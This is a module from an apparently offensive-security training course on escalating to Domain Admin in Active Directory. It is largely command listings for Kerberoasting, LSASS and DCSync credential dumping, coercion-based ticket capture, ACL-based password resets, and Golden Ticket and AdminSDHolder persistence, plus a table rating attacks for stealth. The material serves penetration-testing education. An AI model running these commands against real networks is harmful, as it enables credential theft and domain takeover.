# Domain Admin Escalation

## Unit 8 - Topic 1 | Domain Dominance

---

## Overview

**Domain Admin escalation** is the culmination of an AD attack — achieving Domain Admin (or equivalent) privileges from a lower-privileged position. This topic summarizes all escalation paths and presents a systematic approach to reaching Domain Admin status.

---

## 1. Paths to Domain Admin

```
DOMAIN ADMIN ESCALATION PATHS:

FROM STANDARD DOMAIN USER:
│
├── CREDENTIAL ATTACKS
│   ├── Kerberoasting → Crack service account → DA member
│   ├── AS-REP Roasting → Crack account → Pivot to DA
│   ├── Password Spraying → Hit DA account
│   ├── NTLM Relay → Relay DA auth → Code execution
│   └── Responder → Capture DA hash → Crack or relay
│
├── ACL ABUSE
│   ├── GenericAll on DA group → Add self
│   ├── WriteDACL on domain → Grant DCSync
│   ├── ForceChangePassword on DA → Reset password
│   ├── GenericAll on DA user → Reset password
│   └── WriteOwner → Take ownership → Full control
│
├── DELEGATION ABUSE
│   ├── Unconstrained → Capture DA TGT
│   ├── Constrained → Impersonate DA via S4U
│   ├── RBCD → Impersonate DA to target
│   └── Combine with coercion (PetitPotam, PrinterBug)
│
├── CERTIFICATE ABUSE (AD CS)
│   ├── ESC1 → Request cert as DA
│   ├── ESC8 → Relay to CA → DC cert → DCSync
│   └── ESC4 → Modify template → ESC1
│
├── GPO ABUSE
│   ├── Writable GPO linked to DC OU → Code on DC
│   └── GPP passwords → DA credentials
│
├── TRUST ABUSE
│   ├── Child domain DA → Forest EA (SID History)
│   └── Trust exploitation → Parent domain access
│
└── LOCAL ESCALATION → CREDENTIAL HARVESTING
    ├── Local admin on server → Dump LSASS → DA creds
    ├── Local admin on workstation → Token theft
    └── Chain: Workstation → Server → DC
```

---

## 2. Systematic Escalation Approach

```bash
# === PHASE 1: INITIAL ENUMERATION ===
# Run BloodHound immediately:
bloodhound-python -u user -p pass -d corp.local \
  -ns dc01_ip -c all
# Import and check "Shortest Path to Domain Admins"

# === PHASE 2: QUICK WINS ===
# 1. Kerberoasting:
GetUserSPNs.py corp.local/user:pass -dc-ip dc01 -request
hashcat -m 13100 hashes.txt rockyou.txt

# 2. AS-REP Roasting:
GetNPUsers.py corp.local/user:pass -dc-ip dc01 -request

# 3. GPP Passwords:
crackmapexec smb dc01 -u user -p pass -M gpp_password

# 4. Password in descriptions:
Get-DomainUser -Properties name,description | \
  ? {$_.description -match "pass"}

# 5. LAPS passwords:
crackmapexec ldap dc01 -u user -p pass -M laps

# === PHASE 3: ACL ANALYSIS ===
# Check BloodHound for ACL paths:
# "Find Shortest Paths to Domain Admins from Owned"
# Mark compromised accounts as "Owned"

# === PHASE 4: CREDENTIAL HARVESTING ===
# If you have local admin anywhere:
crackmapexec smb 10.0.0.0/24 -u user -p pass
# Where (Pwn3d!) → dump creds:
crackmapexec smb target -u user -p pass -M lsassy
# New creds → test everywhere → chain access

# === PHASE 5: ESCALATE ===
# Use best path identified above
# Combine techniques as needed
```

---

## 3. Common DA Escalation Scenarios

```bash
# === SCENARIO 1: KERBEROAST → DA ===
# Found: svc_sql has SPN and is member of DA
GetUserSPNs.py corp.local/user:pass -dc-ip dc01 -request
hashcat -m 13100 hash.txt rockyou.txt
# Cracked: svc_sql:Summer2024!
psexec.py corp.local/svc_sql:Summer2024!@dc01

# === SCENARIO 2: ACL CHAIN → DA ===
# BloodHound shows:
# user1 → GenericAll → helpdesk → ForceChangePassword → DA_user
# Step 1:
Add-DomainGroupMember -Identity helpdesk -Members user1
# Step 2:
Set-DomainUserPassword -Identity DA_user \
  -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)

# === SCENARIO 3: UNCONSTRAINED DELEGATION → DA ===
# Found: SERVER01 has unconstrained delegation
# Coerce DC to authenticate to SERVER01:
python3 PetitPotam.py server01 dc01
# On SERVER01, capture DC$ TGT:
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$
# Use DC$ ticket for DCSync:
.\Rubeus.exe ptt /ticket:captured_ticket
lsadump::dcsync /user:corp\Administrator

# === SCENARIO 4: LOCAL ADMIN CHAIN → DA ===
# user → local admin on WS01 → dump creds →
# found svc_backup hash → admin on SRV01 →
# dump creds → found DA cached creds → DC!
```

---

## 4. Post-DA Actions

```bash
# === ONCE YOU HAVE DA ACCESS ===

# 1. DCSync ALL hashes:
secretsdump.py corp.local/da:pass@dc01 -just-dc
# Save: ALL user hashes, krbtgt hash

# 2. Establish persistence:
# Golden Ticket:
lsadump::dcsync /user:corp\krbtgt
# Save krbtgt hash offline → forge tickets anytime

# AdminSDHolder:
Add-DomainObjectAcl -TargetIdentity \
  "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity backup_user -Rights All

# DSRM:
# Extract DSRM hash, set DsrmAdminLogonBehavior=2

# 3. Enumerate forest:
Get-DomainTrust
Get-ForestTrust
# Check for paths to other domains/forests

# 4. Document everything for report:
# - Attack path taken
# - Credentials found
# - Systems compromised
# - Persistence mechanisms
# - Recommendations
```

---

## 5. Prioritized Attack Matrix

| Attack Path | Complexity | Success Rate | Stealth |
|-------------|:----------:|:------------:|:-------:|
| **Kerberoast** | 🟢 Low | 🟢 High | 🟢 High |
| **ACL abuse** | 🟡 Medium | 🟡 Medium | 🟢 High |
| **Local admin chain** | 🟡 Medium | 🟢 High | 🟡 Medium |
| **GPP passwords** | 🟢 Low | 🟡 Medium | 🟢 High |
| **Unconstrained deleg** | 🟡 Medium | 🟡 Medium | 🟡 Medium |
| **AD CS abuse** | 🟡 Medium | 🟢 High | 🟢 High |
| **Password spray** | 🟢 Low | 🟡 Medium | 🟡 Medium |
| **NTLM relay** | 🔴 High | 🟡 Medium | 🟡 Medium |

---

## Summary Table

| Phase | Actions |
|-------|---------|
| **Enumerate** | BloodHound, Kerberoast scan, ACL analysis |
| **Quick wins** | Kerberoast, GPP, descriptions, LAPS |
| **Escalate** | ACL abuse, delegation, credential chain |
| **Achieve DA** | Access DC, DCSync all hashes |
| **Persist** | Golden Ticket, AdminSDHolder, DSRM |

---

## Quick Revision Questions

1. **What is typically the fastest path to Domain Admin?**
2. **Why should BloodHound be the first tool run after initial access?**
3. **What are the first three things to do after achieving DA?**
4. **How does the local admin chain lead to DA?**
5. **Why is Kerberoasting considered low-complexity, high-reward?**

---

[Next: Domain Controller Compromise →](02-domain-controller-compromise.md)

---

*Unit 8 - Topic 1 of 5 | [Back to README](../README.md)*
